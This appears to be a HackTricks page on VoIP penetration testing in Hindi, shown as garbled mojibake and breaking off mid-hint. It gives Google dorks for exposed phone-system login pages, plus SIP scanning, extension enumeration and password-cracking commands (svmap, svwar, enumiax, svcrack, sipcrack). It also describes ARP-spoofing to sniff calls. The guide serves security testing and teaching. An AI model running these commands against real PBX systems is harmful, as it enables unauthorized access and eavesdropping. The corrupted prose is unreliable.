# VoIP рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреА рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдПрдВ
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **Twitter** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ** [**hacktricks рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks-cloud) **рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗ рдЕрдкрдирд╛ рдпреЛрдЧрджрд╛рди рджреЗрдВред**

</details>

## VoIP рдореВрд▓рднреВрдд рдЬрд╛рдирдХрд╛рд░реА

VoIP рдХрд╛рдо рдХрд░рдиреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╕реАрдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рджреЗрдЦреЗрдВ:

{% content-ref url="basic-voip-protocols/" %}
[basic-voip-protocols](basic-voip-protocols/)
{% endcontent-ref %}

## VoIP рдЬрд╛рдВрдЪ

### рдЯреЗрд▓реАрдлреЛрди рдирдВрдмрд░

рд░реЗрдб рдЯреАрдо рдХрд╛ рдПрдХ рдкрд╣рд▓рд╛ рдХрджрдо рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдХрдВрдкрдиреА рдХреЗ рд╕рд╛рде рд╕рдВрдкрд░реНрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрд▓рдмреНрдз рдлреЛрди рдирдВрдмрд░ рдЦреЛрдЬрдирд╛, OSINT рдЙрдкрдХрд░рдг, Google рдЦреЛрдЬ рдпрд╛ рд╡реЗрдм рдкреГрд╖реНрдареЛрдВ рдХреЛ рд╕реНрдХреНрд░реИрдк рдХрд░рдирд╛ред

рдПрдХ рдмрд╛рд░ рдЬрдм рдЖрдкрдХреЗ рдкрд╛рд╕ рдЯреЗрд▓реАрдлреЛрди рдирдВрдмрд░ рд╣реЛ рдЬрд╛рдПрдВ, рдЖрдк рдСрдирд▓рд╛рдЗрди рд╕реЗрд╡рд╛рдУрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдСрдкрд░реЗрдЯрд░ рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

* [https://www.numberingplans.com/?page=analysis\&sub=phonenr](https://www.numberingplans.com/?page=analysis\&sub=phonenr)
* [https://mobilenumbertracker.com/](https://mobilenumbertracker.com/)
* [https://www.whitepages.com/](https://www.whitepages.com/)
* [https://www.twilio.com/lookup](https://www.twilio.com/lookup)

рдпрджрд┐ рдСрдкрд░реЗрдЯрд░ VoIP рд╕реЗрд╡рд╛рдПрдВ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ, рддреЛ рдЖрдк рдкрд╣рдЪрд╛рди рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХрдВрдкрдиреА VoIP рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реА рд╣реИ... рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдХрдВрдкрдиреА рдиреЗ VoIP рд╕реЗрд╡рд╛рдПрдВ рдХрд┐рд░рд╛рдП рдкрд░ рдирд╣реАрдВ рд▓реА рд╣реЛ, рд▓реЗрдХрд┐рди PSTN рдХрд╛рд░реНрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдкрдиреЗ рдЦреБрдж рдХреЗ VoIP PBX рдХреЛ рдкрд╛рд░рдВрдкрд░рд┐рдХ рдЯреЗрд▓реАрдлреЛрди рдиреЗрдЯрд╡рд░реНрдХ рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░ рд░рд╣реА рд╣реЛред

рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдВ рдпрд╛ рд╕рдВрдЧреАрдд рдХрд╛ рдЙрддреНрддрд░ рджреЗрдирд╛ рдЖрдорддреМрд░ рдкрд░ рдЗрд╕рдХрд╛ рд╕рдВрдХреЗрдд рд╣реИ рдХрд┐ VoIP рдХрд╛ рдЙрдкрдпреЛрдЧ рд╣реЛ рд░рд╣рд╛ рд╣реИред

### Google Dorks
```bash
# Grandstream phones
intitle:"Grandstream Device Configuration" Password
intitle:"Grandstream Device Configuration" (intext:password & intext:"Grandstream Device Configuration" & intext:"Grandstream Networks" | inurl:cgi-bin) -.com|org

# Cisco Callmanager
inurl:"ccmuser/logon.asp"
intitle:"Cisco CallManager User Options Log On" "Please enter your User ID and Password in the spaces provided below and click the Log On button"

# Cisco phones
inurl:"NetworkConfiguration" cisco

# Linksys phones
intitle:"Sipura SPA Configuration"

# Snom phones
intitle:"snom" intext:"Welcome to Your Phone!" inurl:line_login.htm

# Polycom SoundPoint IP & phones
intitle:"SoundPoint IP Configuration Utility - Registration"
"Welcome to Polycom Web Configuration Utility" "Login as" "Password"
intext: "Welcome to Polycom Web Configuration Utility" intitle:"Polycom - Configuration Utility" inurl:"coreConf.htm"
intitle:"Polycom Login" inurl:"/login.html"
intitle:"Polycom Login" -.com

# Elastix
intitle:"Elastix - Login page" intext:"Elastix is licensed under GPL"

# FreePBX
inurl:"maint/index.php?FreePBX" intitle: "FreePBX" intext:"FreePBX Admministration"
```
### OSINT рдЬрд╛рдирдХрд╛рд░реА

рд╡реЙрдпрд╕ рдУрдПрд╕рдЖрдИрдПрдирдЯреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рд╕реА рдЕрдиреНрдп рдУрдПрд╕рдЖрдИрдПрдирдЯреА рдЬрд╛рдВрдЪ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рд╡реЙрдпрд╕ рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдиреЗ рдореЗрдВ рдорджрджрдЧрд╛рд░ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

### рдиреЗрдЯрд╡рд░реНрдХ рдЬрд╛рдВрдЪ

* **`nmap`** UDP рд╕реЗрд╡рд╛рдУрдВ рдХреА рд╕реНрдХреИрдирд┐рдВрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдХреНрд╖рдо рд╣реИ, рд▓реЗрдХрд┐рди рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреА рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рд╕реНрдХреИрдирд┐рдВрдЧ рдХреЗ рдХрд╛рд░рдг рдпрд╣ рдмрд╣реБрдд рдзреАрдорд╛ рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдпрд╣ рдмрд╣реБрдд рд╕рдЯреАрдХ рдирд╣реАрдВ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред
* SIPVicious рдХреЗ **`svmap`** (`sudo apt install sipvicious`) рд╕реЗ: рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ SIP рд╕реЗрд╡рд╛рдУрдВ рдХреЛ рдвреВрдВрдврд╝реЗрдЧрд╛ред
* `svmap` **рдЖрд╕рд╛рдиреА рд╕реЗ рдмреНрд▓реЙрдХ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ** рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕рдореЗрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдПрдЬреЗрдВрдЯ `friendly-scanner` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдЖрдк `/usr/share/sipvicious/sipvicious` рд╕реЗ рдХреЛрдб рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ рдЗрд╕реЗ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВред
```bash
# Use --fp to fingerprint the services
svmap 10.10.0.0/24 -p 5060-5070 [--fp]
```
* **`sipscan.py`** рдХреЛ [**sippts**](https://github.com/Pepelux/sippts)**:** рд╕рд┐рдкрд╕реНрдХреИрди UDP, TCP рдпрд╛ TLS рдХреЗ рдКрдкрд░ SIP рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрд╣реБрдд рддреЗрдЬрд╝ рд╕реНрдХреИрдирд░ рд╣реИред рдпрд╣ рдорд▓реНрдЯреАрдереНрд░реЗрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдмрдбрд╝реЗ рдиреЗрдЯрд╡рд░реНрдХ рд░реЗрдВрдЬ рдХреЛ рд╕реНрдХреИрди рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рдЖрд╕рд╛рдиреА рд╕реЗ рдПрдХ рдкреЛрд░реНрдЯ рд░реЗрдВрдЬ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдиреЗ, TCP рдФрд░ UDP рджреЛрдиреЛрдВ рдХреЛ рд╕реНрдХреИрди рдХрд░рдиреЗ, рдПрдХ рдЕрдиреНрдп рд╡рд┐рдзрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ (рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдпрд╣ OPTIONS рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдЧрд╛) рдФрд░ рдПрдХ рдЕрд▓рдЧ User-Agent (рдФрд░ рдЕрдзрд┐рдХ) рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред
```bash
./sipscan.py -i 10.10.0.0/24 -p all -r 5060-5080 -th 200 -ua Cisco [-m REGISTER]

[!] IP/Network: 10.10.0.0/24
[!] Port range: 5060-5080
[!] Protocol: UDP, TCP, TLS
[!] Method to scan: REGISTER
[!] Customized User-Agent: Cisco
[!] Used threads: 200

```
* **рдореЗрдЯрд╛рд╕реНрдкреНрд▓реЛрдЗрдЯ**:
```
auxiliary/scanner/sip/options_tcp normal  No     SIP Endpoint Scanner (TCP)
auxiliary/scanner/sip/options     normal  No     SIP Endpoint Scanner (UDP)
```
#### рдЕрддрд┐рд░рд┐рдХреНрдд рдиреЗрдЯрд╡рд░реНрдХ рдЬрд╛рдВрдЪ

PBX рдЕрдиреНрдп рдиреЗрдЯрд╡рд░реНрдХ рд╕реЗрд╡рд╛рдПрдВ рднреА рдкреНрд░рдХрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬреИрд╕реЗ:

* **69/UDP (TFTP)**: рдлрд░реНрдорд╡реЗрдпрд░ рдЕрдкрдбреЗрдЯ
* **80 (HTTP) / 443 (HTTPS)**: рд╡реЗрдм рд╕реЗ рдЙрдкрдХрд░рдг рдХрд╛ рдкреНрд░рдмрдВрдзрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП
* **389 (LDAP)**: рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЬрд╛рдирдХрд╛рд░реА рд╕рдВрдЧреНрд░рд╣ рдХрд░рдиреЗ рдХрд╛ рд╡рд┐рдХрд▓реНрдк
* **3306 (MySQL**): MySQL рдбреЗрдЯрд╛рдмреЗрд╕
* **5038 (Manager)**: рдЕрдиреНрдп рдкреНрд▓реЗрдЯрдлреЙрд░реНрдореЛрдВ рд╕реЗ Asterisk рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ
* **5222 (XMPP)**: Jabber рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕рдВрджреЗрд╢
* **5432 (PostgreSQL)**: PostgreSQL рдбреЗрдЯрд╛рдмреЗрд╕
* рдФрд░ рдЕрдиреНрдп...

### рд╡рд┐рдзрд┐рдпреЛрдВ рдХрд╛ рдЬрд╛рдВрдЪ

`sipenumerate.py` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ PBX рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдХреМрди рд╕реА рд╡рд┐рдзрд┐рдпрд╛рдБ рдЙрдкрд▓рдмреНрдз рд╣реИрдВ** рдпрд╣ рдкрддрд╛ рд▓рдЧрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред [**sippts**](https://github.com/Pepelux/sippts) рд╕реЗред
```bash
python3 sipenumerate.py -i 10.10.0.10 -r 5080
```
### рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдЧрдгрдирд╛

PBX (рдирд┐рдЬреА рд╢рд╛рдЦрд╛ рдПрдХреНрд╕рдЪреЗрдВрдЬ) рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рд╕рдВрдЧрдарди рдпрд╛ рд╡реНрдпрд╛рдкрд╛рд░ рдХреЗ рднреАрддрд░ рд╡реНрдпрдХреНрддрд┐рдЧрдд рдлреЛрди рд▓рд╛рдЗрдиреЛрдВ, рдЙрдкрдХрд░рдгреЛрдВ рдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рджрд┐рдпреЗ рдЧрдП **рдЕрджреНрд╡рд┐рддреАрдп рдЖрдВрддрд░рд┐рдХ рдкрд╣рдЪрд╛рдирдХрд░реНрддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдВрдЧрдарди рдХреЗ рднреАрддрд░ рдХреЙрд▓ рдХреЛ **рдкреНрд░рднрд╛рд╡реА рд░реВрдк рд╕реЗ рд░реВрдЯ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реЛрддрд╛ рд╣реИ**, рдмрд┐рдирд╛ рдкреНрд░рддреНрдпреЗрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдпрд╛ рдЙрдкрдХрд░рдг рдХреЗ рд▓рд┐рдП рдЕрд▓рдЧ-рдЕрд▓рдЧ рдмрд╛рд╣рд░реА рдлреЛрди рдирдВрдмрд░ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдХреЗред

* **`svwar`** SIPVicious рд╕реЗ (`sudo apt install sipvicious`): `svwar` рдПрдХ рдореБрдлреНрдд SIP PBX рдПрдХреНрд╕рдЯреЗрдВрд╢рди рд▓рд╛рдЗрди рд╕реНрдХреИрдирд░ рд╣реИред рд╕рд┐рджреНрдзрд╛рдВрдд рдореЗрдВ, рдпрд╣ рдкрд╛рд░рдВрдкрд░рд┐рдХ рд╡рд╛рд░рдбрд╛рдпрд▓рд░ рдХреА рддрд░рд╣ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ рдЬрд╣рд╛рдВ **рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреА рдПрдХ рд╢реНрд░реЗрдгреА рдпрд╛ рджрд┐рдП рдЧрдП рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреА рд╕реВрдЪреА рдХреЗ рдЕрдиреБрдорд╛рди рд▓рдЧрд╛рдХрд░ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ**ред
```bash
svwar 10.10.0.10 -p5060 -e100-300 -m REGISTER
```
* **`sipextend.py`** рдпрд╣ [**sippts**](https://github.com/Pepelux/sippts) рд╕реЗ рд╣реИрдВ:** Sipexten SIP рд╕рд░реНрд╡рд░ рдкрд░ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреА рдкрд╣рдЪрд╛рди рдХрд░рддрд╛ рд╣реИред Sipexten рдмрдбрд╝реЗ рдиреЗрдЯрд╡рд░реНрдХ рдФрд░ рдкреЛрд░реНрдЯ рд░реЗрдВрдЬ рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддрд╛ рд╣реИред
```bash
python3 sipexten.py -i 10.10.0.10 -r 5080 -e 100-200
```
* **metasploit**: рдЖрдк рдореЗрдЯрд╛рд╕реНрдкреНрд▓реЛрдЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХреНрд╕рдЯреЗрдВрд╢рди/рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рднреА рдЬрд╛рдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ:
```
auxiliary/scanner/sip/enumerator_tcp  normal  No     SIP Username Enumerator (TCP)
auxiliary/scanner/sip/enumerator      normal  No     SIP Username Enumerator (UDP)
```
* **`enumiax` (`apt install enumiax`): enumIAX** рдПрдХ рдЗрдВрдЯрд░ рдПрд╕реНрдЯреЗрд░рд┐рд╕реНрдХ рдПрдХреНрд╕рдЪреЗрдВрдЬ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ **рдпреВрдЬрд░рдиреЗрдо рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдПрдиреБрдорд░реЗрдЯрд░** рд╣реИред enumIAX рджреЛ рдЕрд▓рдЧ-рдЕрд▓рдЧ рдореЛрдб рдореЗрдВ рдХрд╛рд░реНрдп рдХрд░ рд╕рдХрддрд╛ рд╣реИ; рдХреНрд░рдорд┐рдХ рдпреВрдЬрд░рдиреЗрдо рдЧреЗрд╕рд┐рдВрдЧ рдпрд╛ рд╢рдмреНрджрдХреЛрд╢ рд╣рдорд▓рд╛ред
```bash
enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 10.10.0.10 # Use dictionary
enumiax -v -m3 -M3 10.10.0.10
```
## VoIP рд╣рдорд▓реЗ

### рдкрд╛рд╕рд╡рд░реНрдб рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕

**PBX** рдФрд░ рдХреБрдЫ **рдПрдХреНрд╕рдЯреЗрдВрд╢рди/рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдореЛрдВ** рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рдмрд╛рдж, рдПрдХ рд▓рд╛рд▓ рдЯреАрдо рдХреЛ рдПрдХ рд╢рдмреНрджрдХреЛрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд▓рд┐рдП рдПрдХ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдкрд░ `REGISTER` рд╡рд┐рдзрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреА рд╣реИред

{% hint style="danger" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдПрдХ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо** рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗ рд╕рдорд╛рди рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ рдЕрднреНрдпрд╛рд╕ PBX рд╕рд┐рд╕реНрдЯрдо, рдЗрд╕рдХреЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдФрд░ рд╕рдВрдЧрдарди рдХреА рдкреНрд░рд╛рдердорд┐рдХрддрд╛рдУрдВ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИ...

рдпрджрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗ рд╕рдорд╛рди рдирд╣реАрдВ рд╣реИ, рддреЛ рдЖрдкрдХреЛ рдЗрд╕реЗ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреАред
{% endhint %}

* **`svcrack`** SIPVicious рд╕реЗ (`sudo apt install sipvicious`): SVCrack рдЖрдкрдХреЛ PBX рдкрд░ рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо/рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗ рд▓рд┐рдП рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ рдХреНрд░реИрдХ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред
```bash
svcrack -u100 -d dictionary.txt udp://10.0.0.1:5080 #Crack known username
svcrack -u100 -r1-9999 -z4 10.0.0.1 #Check username in extensions
```
* **`sipcrack.py`** рдпрд╣ [**sippts**](https://github.com/Pepelux/sippts) рд╕реЗ рд╣реИрдВ:** SIP Digest Crack рдПрдХ рдЙрдкрдХрд░рдг рд╣реИ рдЬреЛ SIP рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЗ рднреАрддрд░ рдбрд╛рдЗрдЬреЗрд╕реНрдЯ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рдХреНрд░реИрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рд╣реЛрддрд╛ рд╣реИред

{% code overflow="wrap" %}
```bash
python3 siprcrack.py -i 10.10.0.10 -r 5080 -e 100,101,103-105 -w wordlist/rockyou.txt
```
{% endcode %}

* **Metasploit**:
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb)
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb)

### VoIP рд╕реНрдирд┐рдлрд┐рдВрдЧ

рдпрджрд┐ рдЖрдк рдХрд┐рд╕реА **рдЦреБрд▓реЗ Wifi рдиреЗрдЯрд╡рд░реНрдХ** рдореЗрдВ VoIP рдЙрдкрдХрд░рдг рдЦреЛрдЬрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк **рд╕рднреА рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рд╕реНрдирд┐рдл рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдпрджрд┐ рдЖрдк рдПрдХ рдФрд░ рдмрдВрдж рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рд╣реИрдВ (рдЗрдерд░рдиреЗрдЯ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдпрд╛ рд╕реБрд░рдХреНрд╖рд┐рдд Wifi рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ), рддреЛ рдЖрдк **ARPspoofing** рдХреА рддрд░рд╣ рдХрд╛рд░реНрдп рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреИрд╕реЗ рдХрд┐ [**ARPspoofing**](../../generic-methodologies-and-resources/pentesting-network/#arp-spoofing) рдХреЗ рдмреАрдЪ **PBX рдФрд░ рдЧреЗрдЯрд╡реЗ** рдХреЗ рдмреАрдЪ рдореЗрдВ **MitM рд╣рдорд▓реЗ** рдХрд░рдХреЗ рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рд╕реНрдирд┐рдл рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдиреЗрдЯрд╡рд░реНрдХ рдЬрд╛рдирдХрд╛рд░реА рдореЗрдВ, рдЖрдк **рдЙрдкрдХрд░рдг рдХреЛ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡реЗрдм рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓**, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **рдПрдХреНрд╕рдЯреЗрдВрд╢рди**, **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо**, **IP** рдкрддреЗ, рдпрд╣рд╛рдВ рддрдХ рдХрд┐ **рд╣реИрд╢ рдХрд┐рдП рдЧрдП рдкрд╛рд╕рд╡рд░реНрдб** рдФрд░ **RTP рдкреИрдХреЗрдЯ** рднреА рдорд┐рд▓ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рдЖрдк рдкреБрдирдГ рдЙрддреНрдкрдиреНрди рдХрд░рдХреЗ **рдмрд╛рддрдЪреАрдд рд╕реБрди рд╕рдХрддреЗ рд╣реИрдВ**, рдФрд░ рдЕрдзрд┐рдХред

рдЗрд╕ рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк Wireshark, tcpdump рдЬреИрд╕реЗ рдЙрдкрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ... рд▓реЗрдХрд┐рди рдПрдХ **рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рдЙрдкрдХрд░рдг VoIP рдмрд╛рддрдЪреАрдд рдХреЛ рд╕реНрдирд┐рдл рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП** [**ucsniff**](https://github.com/Seabreg/ucsniff) рд╣реИред

{% hint style="danger" %}
